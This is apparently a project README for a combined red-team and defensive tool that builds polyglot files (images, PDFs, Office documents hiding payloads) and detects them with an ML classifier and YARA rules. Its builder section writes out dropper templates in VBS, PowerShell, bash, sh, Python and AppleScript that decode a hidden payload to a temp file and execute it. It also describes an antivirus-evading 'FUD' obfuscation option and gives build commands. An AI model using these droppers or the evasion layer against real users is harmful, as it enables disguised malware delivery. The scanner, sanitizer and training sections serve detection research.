# PolyglotShield v3.0 — Red Team + Shield Edition

> **⚠ FOR EDUCATIONAL & AUTHORIZED SECURITY TESTING ONLY**
> Unauthorized use against systems you don't own is illegal.

Red team offensive toolkit + ML-powered defensive shield in one unified application. Build polyglot files, detect hidden threats, monitor directories in real-time, and train ML models — all from a single binary.

## Table of Contents

- [Features](#features)
- [Quick Start](#quick-start)
- [How the Builder Works](#how-the-builder-works)
- [How the ML Model Works](#how-the-ml-model-works)
- [How the Training Dataset is Created](#how-the-training-dataset-is-created)
- [Background Monitor Service](#background-monitor-service)
- [CLI Reference](#cli-reference)
- [API Documentation](#api-documentation)
- [Detection Accuracy](#detection-accuracy)
- [Sanitizer Limitations](#sanitizer-limitations)
- [Architecture](#architecture)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

## Features

### ◆ Builder (Offense)

Build polyglot files that are valid in one format but contain hidden payloads.

**Container Types (what the file looks like):**
- JPEG, PNG, GIF — image files that render normally
- PDF — opens in any PDF reader
- ZIP — valid archive with readable entries
- MP4 — plays in any video player
- XLSX, DOCX — opens in Microsoft Office / LibreOffice

**Payload Types (what gets hidden):**
- `exe` — raw executable (default)
- `vbs` — Visual Basic Script dropper (Windows)
- `ps1` — PowerShell dropper (Windows)
- `bash` — Bash shell dropper (Linux/macOS)
- `sh` — POSIX sh dropper (any Unix)
- `python` — Python dropper (cross-platform: Linux/macOS/Windows)
- `applescript` — AppleScript/osascript dropper (macOS)
- `xlsx` — Excel macro document (VBA AutoOpen, auto-adapts to macOS)
- `docx` — Word macro document (VBA AutoOpen, auto-adapts to macOS)

**Target Platform (`--target-os`):**
- `windows` (default) — Windows-only payloads (VBS, PS1)
- `linux` — Linux payloads (bash, sh, python)
- `macos` — macOS payloads (applescript, python, cross-platform macros)
- `all` — Build 3 variants (Linux + macOS + Windows) in one command

> ⚠️ **macOS payloads are EXPERIMENTAL and UNTESTED on real macOS systems.**
> The AppleScript dropper and cross-platform Office macros are generated correctly
> but have not been validated on an actual macOS machine. Linux and Windows payloads
> are fully tested. Use macOS payloads at your own risk and verify before deployment.

**Obfuscation Flags:**
- `--encrypt` — XOR encryption with random 32-byte key
- `--fud` — multi-layer obfuscation (XOR + zlib + base85 + Python stub)
- `--mime` — prepend fake file headers to disguise payload type
- `--payload-type` — wrap payload as VBS/PS1/Office macro dropper

### ⚠ Scanner (Defense)

- **ML Detection** — CatBoost classifier on 338 features (CPU/GPU)
- **YARA Rules** — 32 built-in rules targeting RedTeam patterns + cross-platform payloads
- **Signature Scanning** — PE/ELF/script hidden signature detection
- **Entropy Analysis** — 8-section Shannon entropy
- **Trailing Data Detection** — hidden data after file end markers
- **Extension/Content Mismatch** — detects disguised files
- **MIME Confusion Detection** — dual-header polyglot detection
- **Cross-Platform Payload Detection** — bash, sh, Python, AppleScript droppers in any container

### 🛡 Sanitizer

Strips trailing payloads from polyglot files. Cannot fix extension mismatches or remove embedded payloads without corrupting the host.

### ▶ Real-Time Monitor

- Watchdog-based folder monitoring with debounce
- Auto-scan new/modified files
- Desktop push notifications (Linux/macOS/Windows)

### 🔧 Background Service (NEW)

Run the monitor as a background daemon that persists even when the app is closed:
- **Linux** — systemd user service
- **macOS** — launchd plist
- **Windows** — Scheduled Task (runs at login)

```bash
python polyglot.py service start --dir ~/Downloads   # Start background monitor
python polyglot.py service stop                        # Stop
python polyglot.py service status                      # Check status
python polyglot.py service install                     # Auto-start on boot
python polyglot.py service uninstall                   # Remove auto-start
```

### 🧠 ML Training

- Synthetic data generation (76 polyglot types + 9 benign types)
- CatBoost CPU/GPU training with auto-balanced classes
- Feature importance analysis
- Train/eval split with early stopping

## Quick Start

```bash
# Install
pip install -r requirements.txt

# GUI (PyQt6)
python polyglot.py gui

# TUI (Rich terminal)
python polyglot.py

# CLI
python polyglot.py scan suspicious.jpg
python polyglot.py build cover.jpg payload.exe --type jpeg --fud
python polyglot.py build cover.jpg payload.exe --type jpeg --payload-type vbs
python polyglot.py build cover.jpg payload.exe --type jpeg --payload-type ps1 --encrypt --mime

# Cross-platform payloads
python polyglot.py build cover.jpg payload.bin --type jpeg --payload-type bash --target-os linux
python polyglot.py build cover.jpg payload.bin --type jpeg --payload-type python --target-os all
python polyglot.py build cover.jpg payload.bin --type jpeg --payload-type applescript --target-os macos

# Server mode (web dashboard)
python polyglot.py server --port 8888

# Background service
python polyglot.py service install
python polyglot.py service start --dir ~/Downloads
```

## How the Builder Works

The builder creates **polyglot files** — files that are valid in one format while containing hidden data in another.

### Standard Polyglot (Trailing Data)

```
┌─────────────────────┐
│  Valid JPEG Header   │  ← Image viewers read this
│  JPEG Image Data     │
│  \xff\xd9 (EOI)      │  ← JPEG parser stops here
│  \xff\xfe (Comment)  │  ← JPEG comment marker
│  Hidden Payload      │  ← PE/EXE/VBS/PS1/etc
└─────────────────────┘
```

Each format has a natural "end marker" where parsers stop reading:
- **JPEG**: `\xff\xd9` (End of Image)
- **PNG**: `IEND` chunk
- **GIF**: `\x3b` (trailer byte)
- **PDF**: `%%EOF`
- **ZIP/DOCX/XLSX**: End of Central Directory
- **MP4**: `free` atom appended after structure

### Payload Type Wrappers

When you specify `--payload-type vbs`, the raw payload is wrapped in a VBS dropper script:

```vbs
' VBS dropper (auto-generated)
Dim b64
b64 = "<base64-encoded payload>"
' Decodes payload to temp file and executes it
Dim dom: Set dom = CreateObject("MSXML2.DOMDocument")
' ... (base64 decode + write + execute)
```

Similarly for PowerShell (`--payload-type ps1`):
```powershell
$b64 = "<base64-encoded payload>"
$bytes = [Convert]::FromBase64String($b64)
$tmp = "$env:TEMP\sys<hex>.exe"
[System.IO.File]::WriteAllBytes($tmp, $bytes)
Start-Process -FilePath $tmp -WindowStyle Hidden
```

**Cross-platform wrappers (Linux + macOS):**

Bash dropper (`--payload-type bash --target-os linux`):
```bash
#!/bin/bash
TMPF="/tmp/.sys_<random>.bin"
cat <<'_PAYLOAD_EOF_' | base64 -d > "$TMPF"
<base64-encoded payload>
_PAYLOAD_EOF_
chmod +x "$TMPF"
"$TMPF" &
```

POSIX sh dropper (`--payload-type sh`):
```sh
#!/bin/sh
TMPF="/tmp/.sys_<random>.bin"
> "$TMPF"
printf "<base64-chunk>\n" >> "$TMPF"
# ... (repeated for each 76-char chunk)
chmod +x "$TMPF"
"$TMPF" &
```

Python dropper (`--payload-type python`, works on all platforms):
```python
#!/usr/bin/env python3
import base64, os, sys, stat, tempfile, subprocess
data = base64.b64decode("<base64-encoded payload>")
pf = os.path.join(tempfile.gettempdir(), ".sys_<random>.bin")
with open(pf, "wb") as f: f.write(data)
os.chmod(pf, os.stat(pf).st_mode | stat.S_IEXEC)
subprocess.Popen([pf], start_new_session=True)
```

AppleScript dropper (`--payload-type applescript --target-os macos`):
```applescript
#!/usr/bin/osascript
set payload to "<base64-encoded payload>"
do shell script "echo " & quoted form of payload & " | base64 -D > /tmp/.sys.bin && chmod +x /tmp/.sys.bin && /tmp/.sys.bin &"
```

**Multi-platform build (`--target-os all`):**
```bash
# Builds 3 variants: polyglot_linux.jpg, polyglot_macos.jpg, polyglot_win.jpg
python polyglot.py build cover.jpg payload.bin --payload-type python --target-os all
```

### FUD Cryptor

The `--fud` flag applies multi-layer obfuscation:
1. XOR encrypt with random 32-byte key
2. zlib compress
3. base85 encode
4. Wrap in a Python self-decrypting stub

This hides the raw payload signature (e.g., `MZ` header) from AV scanners.

### MIME Confusion

The `--mime` flag prepends a fake file header to the payload, making it look like a different file type if extracted.

## How the ML Model Works

### Feature Extraction (338 features)

The feature extractor analyzes the raw bytes of each file:

| Category | Features | Description |
|----------|----------|-------------|
| Byte histogram | 256 | Frequency of each byte value (0x00-0xFF) |
| Chunk entropy | 16 | Shannon entropy of 16 equal file chunks |
| Global entropy | 1 | Overall file entropy |
| Magic signatures | 25 | Presence of PE, ELF, ZIP, PDF, etc. |
| Polyglot patterns | 9 | PE-in-PDF, ELF-in-ZIP, script-in-PE, etc. |
| String analysis | 6 | Printable ratio, null ratio, max string length |
| PE header fields | 6 | DOS header, PE signature, sections, machine type |
| ELF header fields | 6 | Class, data encoding, type, machine |
| PDF structure | 6 | Object count, streams, JavaScript, embedded files |
| Header entropy | 4 | First 512 bytes entropy, body entropy, ratio |
| Byte runs | 2 | Max zero run, max FF run |
| File metadata | 2 | Log size, header hash |

### CatBoost Classifier

- **Algorithm**: Gradient boosting on decision trees (CatBoost)
- **Training**: `auto_class_weights=Balanced` to handle class imbalance
- **Early stopping**: Stops when eval loss doesn't improve for 100 rounds
- **Output**: Risk score (0-100%), risk level (SAFE/LOW/MEDIUM/HIGH/CRITICAL), confidence

### Model Performance

| Metric | Value |
|--------|-------|
| Accuracy | 97.7% |
| Benign recall | 90.2% |
| Malicious recall | 100% |
| Features | 338 |
| Training samples | 1,980 |

## How the Training Dataset is Created

The training pipeline generates synthetic polyglot files and extracts features:

### 1. Malicious Samples (87 types × 20 = 1,740 files)

Each type is a combination of:
- **Cover formats**: JPEG, PNG, GIF, BMP, PDF, ZIP
- **Payload types**: PE/EXE, ELF, ZIP, PDF, 7z, RAR, HTML, script, XSS, SQL injection, PHP webshell
- **Cross-platform**: bash, sh, Python, AppleScript droppers in all containers

Examples:
- `exe_in_jpg` — PE hidden after JPEG EOI
- `elf_in_png` — ELF binary after PNG IEND
- `bash_in_jpg` — Bash dropper in JPEG (Linux/macOS)
- `py_in_pdf` — Python dropper in PDF (cross-platform)
- `scpt_in_png` — AppleScript dropper in PNG (macOS)
- `pdf_in_html` — PDF embedded in HTML
- `xss_in_jpg` — XSS payload in JPEG comment
- `phpshell_in_pdf` — PHP webshell in PDF stream

### 2. Benign Samples (9 types × ~7 = 63 files)

Clean files with no hidden data:
- JPEG, PNG, GIF, BMP, PDF, HTML, text, EXE, ELF

### 3. Dataset Augmentation

To balance the 25:1 class imbalance, benign samples are augmented with feature-space noise (±10% Gaussian), expanding to 460 benign samples.

### 4. Sources

- **Polydet/polyglot-database** — known polyglot structures
- **mindcrypt/polyglot** — attack techniques
- **berylliumsec/polyglots** — PNG+script polyglots
- **michenriksen/xss-polyglots** — cross-context XSS vectors
- **PortSwigger** — RCE polyglot vectors

## Background Monitor Service

The background service runs the real-time monitor as a system daemon that persists even when the app is closed.

### Linux (systemd)

```bash
python polyglot.py service install    # Creates ~/.config/systemd/user/polyglot-shield.service
python polyglot.py service start --dir ~/Downloads
systemctl --user status polyglot-shield
journalctl --user -u polyglot-shield -f  # View logs
```

### macOS (launchd)

```bash
python polyglot.py service install    # Creates ~/Library/LaunchAgents/com.polyglot-shield.monitor.plist
python polyglot.py service start --dir ~/Downloads
launchctl list | grep polyglot
```

### Windows (Scheduled Task)

```powershell
python polyglot.py service install    # Creates scheduled task "PolyglotShield Monitor"
python polyglot.py service start --dir C:\Users\you\Downloads
schtasks /query /tn "PolyglotShield Monitor"
```

### Configuration

Config file: `~/.polyglot/monitor.json`

```json
{
  "watch_dirs": ["~/Downloads"],
  "scan_interval": 5,
  "notify": true,
  "auto_quarantine": false,
  "extensions": [".jpg", ".png", ".pdf", ".exe", ".vbs", ".ps1", ".docx", ".xlsx"]
}
```

## CLI Reference

```bash
# Builder
polyglot build <cover> <payload> [options]
  --type <jpeg|png|gif|pdf|zip|mp4|xlsx|docx>  Container type
  --payload-type <TYPE>                         Payload wrapper (see below)
  --target-os <windows|linux|macos|all>         Target platform (default: windows)
  --encrypt                                     XOR encrypt
  --fud                                         FUD cryptor
  --mime                                        MIME confusion
  --output <path>                               Output path

# Payload types by platform:
#   Windows:  vbs, ps1
#   Linux:    bash, sh
#   macOS:    applescript
#   All OS:   python (cross-platform)
#   Office:   xlsx, docx (VBA macro, auto-adapts to macOS)

# Scanner
polyglot scan <file_or_dir>

# Sanitizer
polyglot sanitize <file_or_dir>

# Recover backups
polyglot recover <file_or_dir>

# ML Training
polyglot train --data <csv> [--cpu|--gpu] [--samples N]

# Monitor (foreground)
polyglot monitor <directory>

# Background service
polyglot service start [--dir path]
polyglot service stop
polyglot service status
polyglot service install
polyglot service uninstall

# Server (web dashboard)
polyglot server [--port 8888]

# Modes
polyglot gui          # PyQt6 GUI
polyglot tui          # Rich TUI
polyglot              # Auto-detect (GUI if display, else TUI)
```

## API Documentation

When running `polyglot server`, a REST API is available at `http://localhost:8888`.

### Endpoints

#### POST /api/scan
Scan a file for polyglot threats.

**Request:**
```json
{
  "file": "/path/to/file.jpg"
}
```

**Response:**
```json
{
  "status": "threats_found",
  "findings": [
    {
      "type": "HIDDEN_SIG",
      "detail": "PE/EXE @ 0x1399",
      "severity": "critical",
      "offset": 5017
    }
  ],
  "ml_prediction": {
    "label": "polyglot",
    "risk_score": 94.1,
    "risk_level": "CRITICAL",
    "confidence": 0.94
  }
}
```

#### POST /api/sanitize
Sanitize a file by removing trailing payloads.

**Request:**
```json
{
  "file": "/path/to/file.jpg",
  "backup": true
}
```

**Response:**
```json
{
  "status": "sanitized",
  "detail": "JPEG: 504 bytes removed",
  "backup": "/path/to/file.jpg.bak"
}
```

#### POST /api/build
Build a polyglot file.

**Request:**
```json
{
  "cover": "/path/to/cover.jpg",
  "payload": "/path/to/payload.exe",
  "container_type": "jpeg",
  "payload_type": "vbs",
  "encrypt": true,
  "fud": false,
  "mime": true,
  "output": "/path/to/output.jpg"
}
```

**Response:**
```json
{
  "status": "success",
  "output": "/path/to/output.jpg",
  "container_type": "JPEG",
  "payload_type": "VBS",
  "cover_size": 5013,
  "payload_size": 2004,
  "output_size": 8486,
  "entropy": 3.32
}
```

#### GET /api/quarantine
List quarantined files.

**Response:**
```json
{
  "files": [
    {
      "id": "a1b2c3d4",
      "original_name": "suspicious.jpg",
      "quarantine_date": "2026-05-26T12:00:00",
      "threat_type": "HIDDEN_SIG"
    }
  ]
}
```

#### POST /api/quarantine/restore
Restore a quarantined file.

```json
{"id": "a1b2c3d4", "destination": "/path/to/restore.jpg"}
```

#### GET /api/status
System status.

```json
{
  "version": "3.0",
  "model_loaded": true,
  "model_accuracy": 97.7,
  "monitor_running": true,
  "files_scanned": 1234,
  "threats_found": 5
}
```

#### GET /
Web dashboard (HTML) — embedded dark-themed control panel.

#### GET /api/yara
List all YARA rules with severity and descriptions.

#### GET /api/config
Get current configuration.

#### POST /api/config
Update configuration.

#### POST /api/train
Start ML model training.

```json
{"samples": 50, "use_gpu": false}
```

#### GET /api/logs
Get recent scan/activity logs.

## Detection Accuracy

| Test Case                   | Scanner | Sanitizer | ML    |
|-----------------------------|---------|-----------|-------|
| Clean JPEG                  | ✓ clean | clean     | 75%   |
| JPEG + trailing ZIP         | ✓ THREAT| sanitized | 76%   |
| JPEG + trailing PE          | ✓ THREAT| sanitized | 79%   |
| JPEG + embedded PE          | ✓ THREAT| clean*    | 79%   |
| HTML disguised as .jpg      | ✓ THREAT| danger    | 84%   |
| PDF + trailing ZIP          | ✓ THREAT| sanitized | 79%   |
| PDF + trailing PE           | ✓ THREAT| sanitized | 81%   |
| PNG + trailing ZIP          | ✓ THREAT| sanitized | 73%   |
| GIF + trailing PE           | ✓ THREAT| sanitized | 79%   |
| JPEG + embedded script      | ✓ THREAT| clean*    | 93%   |
| JPEG + bash dropper         | ✓ THREAT| —         | 99%   |
| PNG + bash dropper          | ✓ THREAT| —         | 99%   |
| JPEG + sh dropper           | ✓ THREAT| —         | 98%   |
| JPEG + Python dropper       | ✓ CRIT  | —         | 98%   |
| JPEG + AppleScript dropper  | ✓ THREAT| —         | 99%   |
| ZIP + Python dropper        | ✓ CRIT  | —         | 99%   |
| EXE disguised as .png       | ✓ THREAT| danger    | 74%   |
| ELF disguised as .jpg       | ✓ THREAT| danger    | 27%** |
| Clean PNG                   | ✓ clean | clean     | 72%   |
| Clean PDF                   | ✓ clean | clean     | 82%   |

**Cross-platform payload detection: 100% (30/30 test cases — all payload types × all containers).**

*Embedded payloads can't be removed without corrupting host file.
**ELF-as-JPG ML score is low because the synthetic test file has unusual byte distribution; real-world detection relies on scanner signatures.

## Sanitizer Limitations

**CAN do:**
- Remove trailing data after format end markers (JPEG EOI, PNG IEND, etc.)
- Detect and warn about extension/content mismatches
- Create `.bak` backups before modifying

**CANNOT do:**
- Reconstruct corrupted cover files
- Remove embedded payloads inside valid data (would corrupt the file)
- Fix extension/content mismatches (flags as `danger`, recommends quarantine)
- Guarantee 100% clean output for sophisticated polyglots

## Architecture

```
polyglot.py          — CLI entry point (build/scan/sanitize/train/monitor/service)
polyglot_tui.py      — Rich TUI + all engines (Builder, Detector, Sanitizer)
polyglot_app.py      — PyQt6 GUI (9 panels)
server.py            — Flask API + embedded web dashboard
daemon.py            — Cross-platform background monitor service
engines/
  model.py           — CatBoost ML classifier (338 features)
  features.py        — Feature extraction from raw bytes
  yara_engine.py     — Custom YARA-like rule engine (32 rules)
  scanner.py         — Unified scan pipeline
  quarantine.py      — Encrypted quarantine vault
  config.py          — YAML configuration
  monitor.py         — Watchdog folder monitoring
  notifications.py   — Desktop notifications
  generator.py       — Synthetic training data generation
```

## Credits

### Author
**Mr-DS-ML-85** — AI/ML Engineer, Bangladesh 🇧🇩

### Research & Sources
- **Polydet/polyglot-database** — polyglot file format research and structures
- **mindcrypt/polyglot** — polyglot attack techniques and implementations
- **berylliumsec/polyglots** — PNG+script polyglot research
- **michenriksen/xss-polyglots** — cross-context XSS polyglot vectors
- **PortSwigger Web Security Academy** — RCE polyglot research
- **Trail of Bits** — polyglot file format security research
- ** Ange Albertini** (angie) — file format polyglot pioneer, artwork and research

### Technologies
- **CatBoost** — Yandex gradient boosting library
- **PyQt6** — Qt for Python GUI framework
- **Rich** — Python terminal formatting library
- **Flask** — Python web framework
- **Watchdog** — filesystem event monitoring
- **NumPy/SciPy** — scientific computing
- **scikit-learn** — ML evaluation metrics

### Special Thanks
- The open-source security research community
- Everyone who contributed to polyglot file format research
- The creators of the tools and libraries that make this project possible

## License

MIT

## Author

Mr-DS-ML-85 — [GitHub](https://github.com/Mr-DS-ML-85)

---


